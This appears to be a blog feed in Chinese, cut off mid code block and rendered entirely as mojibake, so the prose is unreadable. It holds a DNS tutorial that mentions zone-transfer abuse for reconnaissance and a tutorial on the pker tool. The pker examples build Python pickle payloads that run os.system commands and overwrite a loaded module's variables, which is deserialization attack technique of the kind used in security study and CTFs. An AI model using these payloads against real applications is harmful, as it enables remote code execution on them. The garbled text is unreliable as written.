·ä¹ŸçŸ¥é“ <code>www.baidu.com</code> çš„ ipã€‚æ‰€ä»¥å®ƒå¯ä»¥ç›´æ¥è¿”å›ç»“æœï¼Œè¿™ä¸€æ­¥æ²¡å•¥å¥½è¯´çš„ã€‚</p><p>åŒæ ·ï¼Œ LocalDNS æœåŠ¡å™¨ä¹Ÿä¼šç¼“å­˜ <code>baidu.com</code> çš„ ipï¼Œå…å¾—ä¸‹æ¬¡æŸ¥çš„æ—¶å€™è¿˜å¾—å†èµ°ä¸€éä¹‹å‰çš„æµç¨‹ï¼ˆå½“ç„¶ä¹Ÿæ˜¯åœ¨ç¼“å­˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹ï¼‰ã€‚</p><p>å„å¤§å…¬å¸ä¸€èˆ¬éƒ½æœ‰è‡ªå·±çš„æƒå¨åŸŸåæœåŠ¡å™¨ï¼Œè‡ªå·±ç»´æŠ¤ DNSï¼Œå¥½å¤„æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼š</p><ol><li>æ–¹ä¾¿ç®¡ç†ã€‚å‡å¦‚ä¸è‡ªå·±ç»´æŠ¤åŸŸåä¿¡æ¯ï¼ŒåŸŸåç”Ÿæ•ˆæ—¶é—´å’Œç¼“å­˜æ—¶é—´éƒ½æ˜¯ä¸å¯æ§çš„ï¼Œè€Œè‡ªå·±æ­å»ºå¯ä»¥é¿å…è¿™äº›é—®é¢˜ã€‚</li><li>åŠ¨æ€ç®¡ç†ã€‚æ¯”å¦‚é€šè¿‡ä¸€äº›è½¯ä»¶æ¥æ›´æ–°è‡ªå·±çš„ DNS ä¿¡æ¯æ›´æ–¹ä¾¿ï¼Œè¿˜å¯ä»¥åšåŠ¨æ€åŸŸåè§£æã€‚</li></ol><h3 id="æµç¨‹æ€»ç»“"><a href="#æµç¨‹æ€»ç»“" class="headerlink" title="æµç¨‹æ€»ç»“"></a>æµç¨‹æ€»ç»“</h3><p>ï¼ˆä»¥ä¸‹æµç¨‹ä»¥ A è®°å½•(è¡¨ç¤ºè¯¥åŸŸåè§£æåˆ°çš„ IP åœ°å€)ä¸ºä¾‹ï¼‰</p><ol><li>è®¾å¤‡ -&gt; LocalDNS æœåŠ¡å™¨ï¼ˆé€’å½’æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ -&gt; DNS æ ¹æœåŠ¡å™¨æˆ–è€…æœ€è¿‘çš„ä¼ æ’­èŠ‚ç‚¹ï¼ˆè¿­ä»£æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ &lt;- DNS æ ¹æœåŠ¡å™¨æˆ–è€…æœ€è¿‘çš„ä¼ æ’­èŠ‚ç‚¹ï¼ˆè¿”å›é¡¶çº§åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ -&gt; DNS é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆè¿­ä»£æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ &lt;- DNS é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆè¿”å›æƒå¨åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ -&gt; DNS æƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆè¿­ä»£æŸ¥è¯¢ï¼‰</li><li>LocalDNS æœåŠ¡å™¨ &lt;- DNS æƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆè¿”å› ipï¼‰</li><li>è®¾å¤‡ &lt;- LocalDNS æœåŠ¡å™¨ï¼ˆè¿”å› ipï¼‰</li></ol><h2 id="DNS-çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ"><a href="#DNS-çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ" class="headerlink" title="DNS çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ"></a>DNS çš„å‡ ä¸ªé‡è¦æ¦‚å¿µ</h2><h3 id="DNS-èµ„æºè®°å½•ï¼ˆResource-Record-RRï¼‰"><a href="#DNS-èµ„æºè®°å½•ï¼ˆResource-Record-RRï¼‰" class="headerlink" title="DNS èµ„æºè®°å½•ï¼ˆResource Record, RRï¼‰"></a>DNS èµ„æºè®°å½•ï¼ˆResource Record, RRï¼‰</h3><p>DNS æœåŠ¡å™¨æœ‰è‡ªå·±çš„åŸŸæ–‡ä»¶ï¼ˆzone fileï¼‰ï¼Œzone file æ˜¯ç”±å¤šä¸ªè®°å½•ç»„æˆçš„ï¼Œæ¯ä¸€ä¸ªè®°å½•å°±è¢«ç§°ä¸ºèµ„æºè®°å½•ã€‚</p><p>å‡å¦‚ä½ ä¹°äº†ä¸€ä¸ªåŸŸåï¼Œéœ€è¦ç»‘å®šåˆ°å¯¹åº”çš„ ip ä¸Šæ¥æä¾› web æœåŠ¡ï¼Œæˆ–è€…è¦æä¾›å…¶ä»–æœåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™åŸŸåçš„é”€å”®æ–¹ä¼šè®©ä½ é€‰æ‹©è§£æçš„ç±»å‹ï¼Œå¸¸è§çš„æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li><code>A</code> è®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ª IPv4 åœ°å€ï¼ˆä¾‹å¦‚ï¼š100.100.100.100ï¼‰æœ€å¸¸ç”¨çš„</li><li><code>CNAME</code> è®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªåŸŸåï¼Œå®ç°ä¸è¢«æŒ‡å‘åŸŸåç›¸åŒçš„è®¿é—®æ•ˆæœï¼Œå¯ä»¥ç®€å•åœ°ç†è§£ä¸ºåŸŸåçš„åˆ«åã€‚æ¯”å¦‚ <code>www.baidu.com</code> å°±æ˜¯ cname åˆ° <code>baidu.com</code> ä¸Šï¼Œç„¶å <code>baidu.com</code> æ˜¯æœ‰è‡ªå·±çš„ A è®°å½•çš„ï¼Œè¿™æ ·æœ‰ä¸ªå¥½å¤„å°±æ˜¯å‡å¦‚æœ‰å¾ˆå¤šä¸ªåŸŸåï¼Œ<code>a.baidu.com</code>ã€<code>b.baidu.com</code>â€¦ï¼Œä½†æ˜¯ ip åªæœ‰ 1 ä¸ªï¼Œå¦‚æœä¸ç”¨ cnameï¼Œå½“è¿™ä¸ª ip å˜æ›´çš„æ—¶å€™ï¼Œæ¯ä¸ªä¸æ­¤ ip ç»‘å®šçš„åŸŸåéƒ½è¦å»æ”¹ A è®°å½•ï¼›ç”¨äº† cname ä¹‹åï¼Œåªéœ€è¦æ”¹ cname çš„åŸŸåï¼ˆ<code>baidu.com</code>ï¼‰çš„ A è®°å½•å³å¯ã€‚ï¼ˆCDN åŠ é€Ÿåº”è¯¥å°±æ˜¯è¿™æ ·åšçš„å¯¹å§~ï¼‰</li><li><code>MX</code> è®°å½•ï¼šæŒ‡å‘ç”µå­é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œä¸€èˆ¬ä¼šæ ¹æ®é‚®ç®±æœåŠ¡å•†æä¾›çš„ MX è®°å½•å¡«å†™æ­¤è®°å½•ã€‚</li><li><code>NS</code> è®°å½•ï¼šæƒå¨åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œå³å°†æŸäº›åŸŸåæŒ‡å®šè®©æŸä¸ª DNS åŸŸåæœåŠ¡å™¨æ¥è§£æã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰é¡¶çº§åŸŸåï¼ˆæˆ–è€…è¯´ä¸€çº§åŸŸåï¼‰æ‰æœ‰ ns è®°å½•ï¼Œæ¯”å¦‚ <code>www.weibo.com</code> æ˜¯æ²¡æœ‰ ns è®°å½•çš„ã€‚</li><li><code>TXT</code> è®°å½•ï¼šå¯ä»»æ„å¡«å†™ã€å¯ä¸ºç©ºã€‚ä¸€èˆ¬åšä¸€äº›éªŒè¯è®°å½•æ—¶ä¼šä½¿ç”¨æ­¤é¡¹ï¼Œä¾‹å¦‚ï¼šSPF è®°å½•ï¼ˆç”¨äºååƒåœ¾é‚®ä»¶ï¼‰</li><li><code>AAAA</code> è®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ª IPv6 åœ°å€ï¼ˆä¾‹å¦‚ï¼šff03:0:0:0:0:0:0:c1ï¼‰</li><li><code>SOA</code> è®°å½•ï¼šSOAï¼ˆStart of Authorityï¼‰å«åšèµ·å§‹æˆæƒæœºæ„è®°å½•ã€‚é€šä¿—åœ°æ¥è®²ï¼Œä¸€ä¸ªåŸŸåå¯èƒ½æœ‰å¾ˆå¤šä¸ª NS è®°å½•ï¼Œå› ä¸ºä¼šæœ‰å¤šå°æœåŠ¡å™¨åœ¨è¿›è¡Œè§£æï¼ˆè´Ÿè´£å‡è¡¡æˆ–è€…å¤‡ä»½ï¼‰ï¼Œä½†å“ªä¸€ä¸ªæ‰æ˜¯ä¸» DNS æƒå¨æœåŠ¡å™¨å‘¢ï¼Ÿè¿™ä¸ªå°±è¦çœ‹ SOA è®°å½•äº†ï¼Œå®ƒè¯´æ˜äº†åœ¨ä¼—å¤š NS è®°å½•é‡Œå“ªä¸€å°æ‰æ˜¯ä¸» DNS æƒå¨æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸» DNS æƒå¨æœåŠ¡å™¨ä¼šè´Ÿè´£å…¶ä»–äº‹æƒ…ï¼Œæ¯”å¦‚å‘Šè¯‰å…¶ä»– NS æƒå¨æœåŠ¡å™¨ä»€ä¹ˆæ—¶å€™è¯¥æ›´æ–°æ•°æ®ï¼ˆé€šè¿‡åŸŸä¼ é€çš„æ–¹å¼ï¼Œä¸‹é¢ä¼šè®²ï¼‰ï¼Œç”šè‡³è®°å½•é‡Œè¿˜æœ‰å¯¹åº”è”ç³»äººçš„é‚®ä»¶ã€TTL ç­‰ä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚</li><li><code>PTR</code> è®°å½•ï¼šPTR è®°å½•æ˜¯ A è®°å½•çš„é€†å‘è®°å½•ï¼Œè´Ÿè´£å°† IP åå‘è§£æä¸ºåŸŸåï¼Œè¿™ä¸ªå†…å®¹ç¨å¤šï¼Œå•ç‹¬æ”¾åœ¨ä¸‹é¢è®²</li><li><code>AXFR</code>ã€<code>IXFR</code> è®°å½•ï¼šæ¶‰åŠåŒºåŸŸä¼ é€ï¼Œå•ç‹¬æ”¾åœ¨ä¸‹é¢è®²</li></ol><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250127192139251.png" alt="image-20250127192139251"></p><h3 id="FQDN"><a href="#FQDN" class="headerlink" title="FQDN"></a>FQDN</h3><p><strong>FQDN</strong>ï¼ˆFully Qualified Domain Nameï¼Œå®Œå…¨é™å®šåŸŸåï¼‰æ˜¯æŒ‡åœ¨åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä¸­ä¸€ä¸ªå®Œæ•´çš„ã€å”¯ä¸€çš„åŸŸåï¼Œç”¨æ¥ç²¾ç¡®æ ‡è¯†äº’è”ç½‘ä¸Šçš„ä¸€ä¸ªä¸»æœºæˆ–æœåŠ¡çš„ä½ç½®ã€‚</p><h4 id="FQDN-çš„ç‰¹ç‚¹ï¼š"><a href="#FQDN-çš„ç‰¹ç‚¹ï¼š" class="headerlink" title="FQDN çš„ç‰¹ç‚¹ï¼š"></a><strong>FQDN çš„ç‰¹ç‚¹ï¼š</strong></h4><ol><li><strong>å®Œæ•´æ€§ï¼š</strong><ul><li>FQDN åŒ…æ‹¬ä¸»æœºåï¼ˆå¦‚ <code>www</code>ï¼‰å’ŒåŸŸåï¼ˆå¦‚ <code>example.com</code>ï¼‰ã€‚</li><li>å¿…é¡»åŒ…å«é¡¶çº§åŸŸåï¼ˆå¦‚ <code>.com</code>ã€<code>.org</code> ç­‰ï¼‰ï¼Œå¹¶æœ€ç»ˆä»¥ä¸€ä¸ªç‚¹ï¼ˆ<code>.</code>ï¼‰ç»“å°¾ï¼ˆåœ¨æŠ€æœ¯ä¸Šï¼Œæœ€åçš„ç‚¹è¡¨ç¤º DNS æ ¹ï¼‰ã€‚</li></ul></li><li><strong>å”¯ä¸€æ€§ï¼š</strong><ul><li>FQDN æ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œå®ƒèƒ½åœ¨æ•´ä¸ªäº’è”ç½‘ä¸­å”¯ä¸€æ ‡è¯†ä¸€å°è®¾å¤‡æˆ–æœåŠ¡ã€‚</li><li>æ¯ä¸ª FQDN éƒ½æŒ‡å‘ä¸€ä¸ªç‰¹å®šçš„ IP åœ°å€ï¼ˆé€šè¿‡ DNS è§£æï¼‰ã€‚</li></ul></li><li><strong>ç»“æ„</strong><ul><li>&lt;ä¸»æœºå&gt;.&lt;å­åŸŸå&gt;.&lt;äºŒçº§åŸŸå&gt;.&lt;é¡¶çº§åŸŸå&gt;.</li></ul></li><li><strong>ç”¨é€”</strong><ul><li>HTTPS è¯ä¹¦ï¼ˆSSL&#x2F;TLSï¼‰é€šå¸¸ç»‘å®šåˆ° FQDNï¼Œç¡®ä¿é€šä¿¡çš„å®‰å…¨æ€§å’Œå”¯ä¸€æ€§ã€‚</li><li>åœ¨é…ç½®é‚®ä»¶æœåŠ¡å™¨ã€SSH æœåŠ¡ç­‰ç½‘ç»œæœåŠ¡æ—¶ï¼Œé€šå¸¸éœ€è¦å¡«å†™ FQDN ä»¥ç¡®ä¿æœåŠ¡å¯ä»¥è¢«æ­£ç¡®è¯†åˆ«</li></ul></li></ol><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p><code>DDNS</code>æ¯”<code>DNS</code>å¤šäº†ä¸€ä¸ªDå¤šçš„å°±æ˜¯ä¸€ä¸ª<code>dynamic(åŠ¨æ€çš„)</code></p><p><code>DDNS</code>æ˜¯ä¸€ç§åŸŸåè§£ææœåŠ¡ï¼Œç”¨æ¥å°†åŠ¨æ€å˜åŒ–çš„ IP åœ°å€å®æ—¶æ›´æ–°åˆ°åŸŸåè§£æè®°å½•ä¸­ï¼Œä»è€Œè®©ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡å›ºå®šçš„åŸŸåè®¿é—® IP åœ°å€ä¸æ–­å˜åŒ–çš„è®¾å¤‡ã€‚</p><h2 id="Non-authoritative-answer"><a href="#Non-authoritative-answer" class="headerlink" title="Non-authoritative answer"></a>Non-authoritative answer</h2><p>è¿™ä¸ªæ„æ€å°±æ˜¯è¿™ä¸ªè§£æè®°å½•æ˜¯ä» LocalDNS çš„ç¼“å­˜é‡Œæ‹¿æ¥çš„ï¼Œè€Œä¸æ˜¯å‘çœŸæ­£è´Ÿè´£è¿™ä¸ªåŸŸåçš„ DNS æƒå¨æœåŠ¡å™¨æ‹¿æ¥çš„</p><h2 id="DNS-åŒºåŸŸä¼ é€"><a href="#DNS-åŒºåŸŸä¼ é€" class="headerlink" title="DNS åŒºåŸŸä¼ é€"></a>DNS åŒºåŸŸä¼ é€</h2><p>æ˜¯ä¸€ç§ç”¨äºåœ¨ DNS æœåŠ¡å™¨ä¹‹é—´å¤åˆ¶ DNS åŒºåŸŸæ•°æ®çš„æœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯ç¡®ä¿å¤šä¸ª DNS æœåŠ¡å™¨ä¸­å­˜å‚¨çš„åŸŸåè§£æè®°å½•ä¿æŒä¸€è‡´ã€‚è¿™ç§æœºåˆ¶é€šå¸¸åœ¨ä¸»ä» DNS æœåŠ¡å™¨ä¹‹é—´ä½¿ç”¨,DNSåŒºåŸŸä¼ é€æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li><code>axfr</code>ï¼šå®Œæ•´åŒºåŸŸä¼ é€</li><li><code>ixfr</code>ï¼šå¢é‡åŒºåŸŸä¼ é€</li></ol><p>æ‰€ä»¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ DNS åŒºåŸŸä¼ é€æ“ä½œåªæœ‰ç»è¿‡æˆæƒçš„ DNS æœåŠ¡å™¨æ‰æœ‰æƒæ‰§è¡Œï¼Œä½†è®¸å¤š DNS æœåŠ¡å™¨å´è¢«é”™è¯¯åœ°é…ç½®æˆåªè¦æœ‰äººå‘å‡ºè¯·æ±‚ï¼Œå°±ç›´æ¥æä¾›ä¸€ä¸ª zone çš„ DNS å†…å®¹ã€‚DNS åŸŸä¼ é€æ¼æ´ä¼šåœ¨ä¸‹ä¸€ç¯‡è¯¦ç»†ä»‹ç»ï¼Œè¿™ä¸ªæ‰‹æ®µæ˜¯å‰äº›å¹´ç”¨äºä¿¡æ¯æ”¶é›†çš„æ‰‹æ®µä¹‹ä¸€ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pker</title>
    <link href="/2025/01/26/pker/"/>
    <url>/2025/01/26/pker/</url>
    
    <content type="html"><![CDATA[<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li>pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚</a></li><li>ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼ˆç”Ÿæˆpickleç‰ˆæœ¬0çš„opcodeï¼‰ã€‚</li><li>å†æ¬¡å»ºè®®ï¼Œåœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚</li></ul><h2 id="pkerèƒ½åšçš„äº‹"><a href="#pkerèƒ½åšçš„äº‹" class="headerlink" title="pkerèƒ½åšçš„äº‹"></a>pkerèƒ½åšçš„äº‹</h2><blockquote><ul><li>å˜é‡èµ‹å€¼ï¼šå­˜åˆ°memoä¸­ï¼Œä¿å­˜memoä¸‹æ ‡å’Œå˜é‡åå³å¯</li><li>å‡½æ•°è°ƒç”¨</li><li>ç±»å‹å­—é¢é‡æ„é€ </li><li>listå’Œdictæˆå‘˜ä¿®æ”¹</li><li>å¯¹è±¡æˆå‘˜å˜é‡ä¿®æ”¹</li></ul></blockquote><p>å…·ä½“æ¥è®²ï¼Œå¯ä»¥ä½¿ç”¨pkerè¿›è¡ŒåŸå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œã€å®ä¾‹åŒ–æ–°çš„å¯¹è±¡ã€‚</p><h2 id="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"><a href="#ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹"></a>ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹</h2><ol><li>pkerä¸­çš„é’ˆå¯¹pickleçš„ç‰¹æ®Šè¯­æ³•éœ€è¦é‡ç‚¹æŒæ¡</li><li>æ­¤å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼špythonä¸­çš„æ‰€æœ‰ç±»ã€æ¨¡å—ã€åŒ…ã€å±æ€§ç­‰éƒ½æ˜¯å¯¹è±¡ï¼Œè¿™æ ·ä¾¿äºå¯¹å„æ“ä½œè¿›è¡Œç†è§£ã€‚</li><li>pkerä¸»è¦ç”¨åˆ°<code>GLOBALã€INSTã€OBJ</code>ä¸‰ç§ç‰¹æ®Šçš„å‡½æ•°ä»¥åŠä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼Œå…¶ä»–çš„opcodeä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ï¼š</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä»¥ä¸‹<span class="hljs-keyword">module</span>éƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­<span class="hljs-keyword">module</span><br>è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´<br>å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»·<br><br><span class="hljs-keyword">GLOBAL</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;c&#x27;</span><br>è·å–<span class="hljs-keyword">module</span>ä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼š<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,instance(callableã€<span class="hljs-keyword">module</span>éƒ½æ˜¯instance)  <br><br>INST<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;i&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼š<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>è¾“å…¥ï¼š<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;o&#x27;</span><br>å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼š<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>è¾“å…¥ï¼šcallable,para<br><br>xxx(xx,...)<br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;R&#x27;</span><br>ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>æˆ–<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;s&#x27;</span><br>æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;b&#x27;</span><br>å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®<br><br><span class="hljs-keyword">return</span><br>å¯¹åº”opcodeï¼šb<span class="hljs-string">&#x27;0&#x27;</span><br>å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼š<br><span class="hljs-keyword">return</span> xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ol><li>ç”±äºopcodeæœ¬èº«çš„åŠŸèƒ½é—®é¢˜ï¼Œpkerè‚¯å®šä¹Ÿä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸º<strong>å·¦å€¼</strong>ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚<code>getattr</code>ã€<code>dict.get</code>ï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>s</code>ã€<code>u</code>ã€<code>b</code>æ“ä½œç¬¦ï¼Œ<strong>ä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„</strong>ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚</li><li>pkerè§£æ<code>S</code>æ—¶ï¼Œç”¨å•å¼•å·åŒ…è£¹å­—ç¬¦ä¸²ã€‚æ‰€ä»¥pkerä»£ç ä¸­çš„åŒå¼•å·ä¼šè¢«è§£æä¸ºå•å¼•å·opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>è¢«è§£æä¸ºï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"><a href="#pkerï¼šå…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="pkerï¼šå…¨å±€å˜é‡è¦†ç›–"></a>pkerï¼šå…¨å±€å˜é‡è¦†ç›–</h4><ul><li>è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥çš„<code>secret</code>æ¨¡å—ä¸­çš„<code>name</code>ä¸<code>category</code>å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># pythonçš„æ‰§è¡Œæ–‡ä»¶è¢«è§£æä¸º__main__å¯¹è±¡ï¼Œsecretåœ¨è¯¥å¯¹è±¡ä»å±ä¸‹</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ï¼š</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šç»™å‡ºä¸€äº›å…·ä½“çš„åŸºæœ¬æ“ä½œçš„å®ä¾‹ã€‚</p><h4 id="pkerï¼šå‡½æ•°æ‰§è¡Œ"><a href="#pkerï¼šå‡½æ•°æ‰§è¡Œ" class="headerlink" title="pkerï¼šå‡½æ•°æ‰§è¡Œ"></a>pkerï¼šå‡½æ•°æ‰§è¡Œ</h4><ul><li>é€šè¿‡<code>b&#39;R&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 